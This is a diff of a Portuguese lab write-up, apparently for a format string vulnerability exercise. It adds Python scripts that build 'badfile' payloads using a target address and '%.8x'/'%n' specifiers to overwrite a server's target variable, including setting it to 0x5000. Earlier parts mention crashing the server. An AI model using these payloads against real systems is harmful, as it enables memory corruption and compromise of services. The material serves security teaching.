@@ -8,7 +8,7 @@ Nesta tarefa tinhamos como objetivo causar o crash do servidor.
 ![image 1](docs/images/Captura_de_ecr%C3%A3_2023-11-17_180216.png)
 
 **Servidor sem crash, ou seja, aparece:**<br>
-```(^_^)(^_^)  Returned properly (^_^)(^_^)```
+`(^_^)(^_^)  Returned properly (^_^)(^_^)`
 
 ![image 2](docs/images/Captura_de_ecr%C3%A3_2023-11-17_175035.png)
 
@@ -16,7 +16,7 @@ Nesta tarefa tinhamos como objetivo causar o crash do servidor.
 ![image 3](docs/images/Captura_de_ecr%C3%A3_2023-11-17_180241.png)
 
 **Servidor com crash, ou seja, não aparece:**<br>
-```(^_^)(^_^)  Returned properly (^_^)(^_^)```<br>
+`(^_^)(^_^)  Returned properly (^_^)(^_^)`<br>
 
 ![image 4](docs/images/Captura_de_ecr%C3%A3_2023-11-17_180302.png)
 
@@ -62,12 +62,78 @@ content[4:4+len(fmt)] = fmt
 # Write the content to badfile
 with open('badfile', 'wb') as f:
   f.write(content)
-
 ```
 **Servidor com a mensagem secreta.**<br>
 ![image 7](docs/images/Captura_de_ecr%C3%A3_2023-11-17_191650.png)
 
 ## Tarefa 3.A
 
+Nesta tarefa tinhamos como objetivo alterar o `target` para qualquer valor. Para esse fim usamos `%n`.
+
+***build_string.py* usada.**<br>
+```python
+#!/usr/bin/python3
+import sys
+
+# Initialize the content array
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+# This line shows how to store a 4-byte integer at offset 0
+number  = 0x080e5068
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+
+# This line shows how to store a 4-byte string at offset 4
+#content[4:8]  =  ("abcd").encode('latin-1')
+
+# This line shows how to construct a string s with
+#   12 of "%.8x", concatenated with a "%n"
+s = "%.8x"*63 + "%n"
+
+# The line shows how to store the string s at offset 8
+fmt  = (s).encode('latin-1')
+content[4:4+len(fmt)] = fmt
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+**Servidor com o `target` alterado.**<br>
+![image 8](docs/images/Captura_de_ecr%C3%A3_2023-11-17_194820.png)
+
 ## Tarefa 3.B
 
+Nesta tarefa tinhamos como objetivo alterar o valor do `target`para `0x5000`. Como `0x5000` em decimal é `20480` acrescentámos `19980` bytes antes do `%n` na forma de `%x`.
+
+***build_string.py* usada.**<br>
+```python
+#!/usr/bin/python3
+import sys
+
+# Initialize the content array
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+# This line shows how to store a 4-byte integer at offset 0
+number  = 0x080e5068
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+
+# This line shows how to store a 4-byte string at offset 4
+#content[4:8]  =  ("abcd").encode('latin-1')
+
+# This line shows how to construct a string s with
+#   12 of "%.8x", concatenated with a "%n"
+s = "%.8x"*62 + "%19980x" + "%n"
+
+# The line shows how to store the string s at offset 8
+fmt  = (s).encode('latin-1')
+content[4:4+len(fmt)] = fmt
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+**Servidor com o `target` alterado para `0x5000`.**<br>
+![image 9](docs/images/Captura_de_ecr%C3%A3_2023-11-17_195730.png)
